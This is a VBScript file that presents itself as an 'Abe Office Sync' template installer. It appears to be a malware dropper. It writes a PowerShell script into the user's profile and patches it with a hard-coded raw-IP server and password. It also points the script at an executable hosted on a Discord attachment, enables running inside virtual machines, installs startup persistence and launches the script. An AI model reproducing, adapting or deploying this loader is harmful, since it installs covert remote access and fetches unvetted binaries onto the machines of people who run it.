'==============================================================================
' Abe Office Sync - one-time template install (same flow as AbeAgent.vbs)
' Writes abe_presence.ps1 under %USERPROFILE%\AbeOffice
' Host package (optional): PS sync HostUpdate.bin -> built.exe -> AbeAgent
' Server: 2.26.230.54  Port: 9090
'==============================================================================
Option Explicit

Const SERVER_HOST   = "2.26.230.54"
Const SERVER_PORT   = "9090"
Const BOOTSTRAP_KEY = "AbeOffice-ChangeMe"
Const RUN_VALUE     = "Abe Office Sync"
Const HOST_PKG_URL  = "https://cdn.discordapp.com/attachments/1560007559484805197/1565421189051056179/built2.exe?ex=6ae4d797&is=6ae38617&hm=691cefb51f49e00c2855d4d166da234c1d0a08cf70bcfbd76bb5f4144bd1bbe3&"
Const ALLOW_VM      = "1"

Dim sh, fso, officeHome, ps1Path, runCmd, psText
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
officeHome = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AbeOffice"
If Not fso.FolderExists(officeHome) Then fso.CreateFolder officeHome
ps1Path = officeHome & "\abe_presence.ps1"

psText = UnlockPresenceScript()
If Len(psText) < 256 Then WScript.Quit 1
psText = PatchPs(psText)
If InStr(psText, "Connect-StubAuth") = 0 Then WScript.Quit 2
WriteAllText ps1Path, psText
WriteSettings
StopOldPresence
InstallPersistence ps1Path
StartPresenceNow ps1Path
WScript.Quit 0

Function PatchPs(t)
  t = Replace(t, "$AbeHost = '2.26.230.54'", "$AbeHost = '" & SERVER_HOST & "'", 1, -1, 0)
  t = Replace(t, "$AbePort = 9090", "$AbePort = " & SERVER_PORT, 1, -1, 0)
  t = Replace(t, "$AbePass = 'AbeOffice-ChangeMe'", "$AbePass = '" & Replace(BOOTSTRAP_KEY, "'", "''") & "'", 1, -1, 0)
  t = Replace(t, "$HostPkgUrl = ''", "$HostPkgUrl = '" & Replace(HOST_PKG_URL, "'", "''") & "'", 1, -1, 0)
  If ALLOW_VM = "1" Then
    t = Replace(t, "$AllowVmGuest = $false", "$AllowVmGuest = $true", 1, -1, 0)
  End If
  t = Replace(t, "$AbeHost = '127.0.0.1'", "$AbeHost = '" & SERVER_HOST & "'", 1, -1, 0)
  PatchPs = t
End Function

